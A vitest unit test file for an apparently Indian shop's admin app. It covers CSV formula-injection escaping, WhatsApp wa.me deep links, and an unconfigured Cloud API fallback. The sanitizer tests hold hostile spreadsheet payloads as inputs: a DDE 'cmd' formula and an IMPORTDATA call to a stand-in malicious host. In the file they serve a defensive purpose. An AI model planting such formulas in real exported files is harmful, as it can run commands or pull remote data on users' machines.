import { describe, it, expect } from "vitest";
import { WhatsAppProvider } from "@/lib/whatsapp/provider";

// Test helper matching CSV sanitization in CustomersDirectoryView
function sanitizeCell(text: string | null | undefined): string {
  if (!text) return '""';
  let str = String(text);
  if (/^[=+\-@\t\r]/.test(str)) {
    str = `'${str}`; // Escape formula trigger
  }
  return `"${str.replace(/"/g, '""')}"`;
}

describe("Admin & Security Unit Tests", () => {
  describe("CSV Formula Injection Sanitization", () => {
    it("escapes malicious formula triggers starting with = + - @", () => {
      expect(sanitizeCell("=cmd|'/C calc'!A0")).toBe(`"'=cmd|'/C calc'!A0"`);
      expect(sanitizeCell("+123456")).toBe(`"'+123456"`);
      expect(sanitizeCell("-SUM(A1:A10)")).toBe(`"'-SUM(A1:A10)"`);
      expect(sanitizeCell("@IMPORTDATA('http://malicious.site')")).toBe(
        `"'@IMPORTDATA('http://malicious.site')"`
      );
    });

    it("leaves normal safe names unescaped", () => {
      expect(sanitizeCell("Priya Sharma")).toBe(`"Priya Sharma"`);
      expect(sanitizeCell("Bengaluru, Karnataka")).toBe(`"Bengaluru, Karnataka"`);
      expect(sanitizeCell("9876543210")).toBe(`"9876543210"`);
    });

    it("escapes quotes inside text properly", () => {
      expect(sanitizeCell('Handmade "Crochet" Bear')).toBe(
        `"Handmade ""Crochet"" Bear"`
      );
    });
  });

  describe("WhatsApp Deep-link Helper", () => {
    it("generates correct wa.me link with country code 91 for 10-digit Indian numbers", () => {
      const link = WhatsAppProvider.generateDeepLink("9876543210", "Hello Priya!");
      expect(link).toContain("https://wa.me/919876543210?text=Hello%20Priya!");
    });

    it("preserves international numbers with country code", () => {
      const link = WhatsAppProvider.generateDeepLink("+919876543210", "Order Ready");
      expect(link).toContain("https://wa.me/919876543210?text=Order%20Ready");
    });
  });

  describe("WhatsApp Cloud API Fallback Boundary", () => {
    it("reports not configured gracefully when credentials are absent", async () => {
      const result = await WhatsAppProvider.sendTemplateNotification({
        toPhone: "9876543210",
        templateName: "order_confirmation",
        parameters: { order_number: "VCG-2026-0001" },
      });
      expect(result.sent).toBe(false);
      expect(result.reason).toBe("NOT_CONFIGURED");
    });
  });
});

